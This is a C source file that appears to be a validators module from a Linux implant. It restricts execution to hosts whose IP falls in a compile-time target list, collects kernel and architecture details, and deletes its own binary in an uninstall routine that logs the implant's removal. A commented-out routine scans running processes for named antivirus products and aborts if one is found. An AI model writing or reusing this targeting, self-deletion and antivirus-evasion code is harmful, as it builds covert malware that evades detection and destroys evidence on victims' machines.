#include <ifaddrs.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <unistd.h>

#include "validators.h"
#include "utils.h"

// const char* KNOWN_AV_LIST[] = {"XProtect", "avast", "avg", "kaspersky", "defender"};
// const int KNOWN_AV_NUM = 5;

/**
 * Checks to see if ip_str is within the network. Takes in the family (IPv4 or IPv6) because 
 * calculation is done differently. Also takes in the prefix (/24, /16, etc) in order to determine
 * if ip_str is contained within network.
 */
static bool check_in_network(int af, const char *ip_str, const char *network, const int prefix) {
#ifdef CORRECT_IP_LIST
    /* if family is IPv4 */
    if(af == AF_INET) {
        uint32_t ip, net, mask;

        /* convert from text to binary form */
        inet_pton(AF_INET, ip_str, &ip);
        inet_pton(AF_INET, network, &net);
        
        /* converts from network byte order to host byte order */
        ip = ntohl(ip);
        net = ntohl(net);

        /* make network mask with prefix */
        mask = 0xFFFFFFFFu << (32 - prefix);

        /* perform bitwise and to determine if the network addresses match */
        return (ip & mask) == (net & mask);
    }

    /* if family is IPv6 */
    else if(af == AF_INET6) {
        unsigned char ip[IPV6_ADDR_LEN], net[IPV6_ADDR_LEN], mask[IPV6_ADDR_LEN];

        int network_bytes = (prefix / 8);
        int network_bits = (prefix % 8);
        
        inet_pton(AF_INET6, ip_str, &ip);
        inet_pton(AF_INET6, network, &net);

        memset(mask, 0, IPV6_ADDR_LEN);
        for(int i = 0; i < network_bytes; i++) {
            mask[i] = 0xFF;
        }

        if(network_bits > 0 && network_bytes < IPV6_ADDR_LEN ) {
            mask[network_bytes] = 0xFF << (8-network_bits);
        }
        
        for(int i = 0; i < IPV6_ADDR_LEN; i++) {
            if ((ip[i] & mask[i]) != (net[i] & mask[i])) {
                return false;
            }
        }

        return true;
    }

    /* family is not IPv4 or IPv6 */
    return false;
#endif
}

/**
 * Takes in family and an IP address. Loops through CORRECT_IP_LIST that is provided
 * at compile time to check if the current IP address on the machine matches any
 * IP in the list. Considers the family (IPv4 or IPv6) because CORRECT_IP_LIST
 * can contain a network address (192.168.1.0/24) and it needs to check if the current
 * IP address is within the network.
 */
static bool check_ip_list(int family, char *ip_addr) {
#ifdef CORRECT_IP_LIST
    /* grab CORRECT_IP_LIST and determine size */
    char *correct_ip_list[] = CORRECT_IP_LIST;
    int correct_ip_list_cnt = sizeof(correct_ip_list) / sizeof(char *);

    /* loop through CORRECT_IP_LIST and determine if ip_addr matches any of them */
    for(int i = 0; i < correct_ip_list_cnt; i++) {
        char *correct_ip = correct_ip_list[i];
        char *ptr;

        /* if IP address is a network address */
        if((ptr = strstr(correct_ip, "/"))) {
            char network[NI_MAXHOST];
            memset(network, 0, NI_MAXHOST);
            strncpy(network, correct_ip, ptr-correct_ip);

            /* if ip_addr is within the IP network return true */
            if(check_in_network(family, ip_addr, network, atoi(ptr+1))) {
                return 1;
            }
        }

        /* else the IP in the CORRECT_IP_LIST is an IP address, return true if match */
        else {
            if(strncmp(correct_ip, ip_addr, strlen(ip_addr)) == 0) {
                return true;
            }
        }
    }

    /* looked through CORRECT_IP_LIST and ip_addr did not match any */
    return false;
#endif
}

/**
 * Loops through machine's interfaces to determine if any IP addresses match any IP/network address
 * in CORRECT_IP_LIST. 
 */
static Validation_Status check_if_host_ip_is_correct(host_profile *host_info) {
#ifdef CORRECT_IP_LIST
    char ip_addr[NI_MAXHOST];
    struct ifaddrs *ifaddr, *ifa;
    int s, family;
    unsigned long sockaddr_struct_size;

    /* return error if getifaddrs fails */
    if((s = getifaddrs(&ifaddr)) != 0) {
        return ERR_IFADDR_FAILED;
    }

    /* loop through ifaddrs to see if any IPs match */
    for(ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;
        
        /* grab either IPv4 or IPv6 */
        family = ifa->ifa_addr->sa_family;
        if(family == AF_INET) {
            sockaddr_struct_size = sizeof(struct sockaddr_in);
        } else if(family == AF_INET6){
            sockaddr_struct_size = sizeof(struct sockaddr_in6);
        }
        else {
            continue;
        }

        /* convert socket to human readable IP address */
        s = getnameinfo(ifa->ifa_addr, sockaddr_struct_size, ip_addr, sizeof(ip_addr), NULL, 0, NI_NUMERICHOST);
        if (s != 0){
            return ERR_NAMEINFO_FAILED;
        }

        /* if loopback address continue */
        if (strcmp(ip_addr, IPV4_LOOPBACK_ADDR) == 0 || strcmp(ip_addr, IPV6_LOOPBACK_ADDR) == 0)
            continue;
        
        /* check IP list provided to see if any match */
        if(check_ip_list(family, ip_addr) == 1) {
            strncpy(host_info->interface_name, ifa->ifa_name, MAX_INTERFACE_LEN);
            strncpy(host_info->host_ip, ip_addr, NI_MAXHOST);
            host_info->family = family;
            freeifaddrs(ifaddr);
            return CORRECT_HOST;
        }

    }

    /* looked through all interfaces and no IP match */
    freeifaddrs(ifaddr);
    return ERR_NO_IP_MATCH;
#endif
}

Validation_Status check_if_host_is_correct(host_profile *host_info) {
#ifdef CORRECT_IP_LIST
    Validation_Status s;

    if((s = check_if_host_ip_is_correct(host_info)) != CORRECT_HOST) {
        return s;
    }

    // other checks later...
    return CORRECT_HOST;
#endif
#ifndef CORRECT_IP_LIST
    return ERR_IP_LIST_NOT_DEFINED;
#endif
}

static void get_system_info(struct utsname *system_info) {
    if(uname(system_info) != 0) {
        // fail maybe do it some other way?
        #ifdef DEBUG
        perror("Uname failed");
        #endif
        exit(1);
    }
    return;
}

Profile *get_profile() {
    struct utsname system_info;
    get_system_info(&system_info);

    Profile *profile = (Profile *) malloc(sizeof(Profile));
    memset(profile, 0, sizeof(Profile));

    profile->kernel = strdup(system_info.sysname);
    profile->kernel_release = strdup(system_info.release);
    profile->kernel_version = strdup(system_info.version);
    profile->arch = strdup(system_info.machine);

    return profile;
}

void free_profile(Profile **pProfile) {
    if(!pProfile || !*pProfile) return;

    Profile *profile = *pProfile;

    free(profile->kernel);
    free(profile->kernel_release);
    free(profile->kernel_version);

    free(profile);
    *pProfile = NULL;
}



void uninstall() {
    char path[PATH_SIZE];
    int len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if(len < 0) {
        LOG("Failed to read path: %s\n", strerror(errno));
        return;
    }
    path[len] = '\0';

    if(remove(path) == 0) {
        LOG("Implant file successfully removed at path %s\n", path);
    } else {
        LOG("Error removing implant at path %s: %s\n", path, strerror(errno));
    }
}

void check_for_antivirus() {
    // FILE *file = popen("ps -A", "r");

    // if(!file) {
    //     #ifdef DEBUG
    //     fprintf(stderr, "popen failed\n");
    //     #endif
    //     exit(EXIT_FAILURE);
    // }

    // char buffer[256];
    // while(fgets(buffer, sizeof(buffer), file) != NULL) {
    //     for(int i = 0; i < KNOWN_AV_NUM; i++) {
    //         if(strstr(buffer, KNOWN_AV_LIST[i]) != NULL) {
    //             #ifdef DEBUG
    //             fprintf(stderr, "Antivirus %s found. Abort.\n", KNOWN_AV_LIST[i]);
    //             #endif
    //             pclose(file);
    //             exit(EXIT_FAILURE);
    //         }
    //     }
    // }
    
    // pclose(file);
    // return;
}


const char *get_validator_status_message(Validation_Status status) {
#ifdef DEBUG
    switch (status) {
        case CORRECT_HOST:
            return "Host is correct";
        case ERR_NO_IP_MATCH:
            return "Host IP is not in valid IP list";
        case ERR_IFADDR_FAILED:
            return "Failed to get interface addresses";
        case ERR_NAMEINFO_FAILED:
            return "Failed to get translate IP into a string";
        case ERR_IP_LIST_NOT_DEFINED:
            return "IP list is not defined";
        default:
            return "Unknown error";
    }
#endif
}
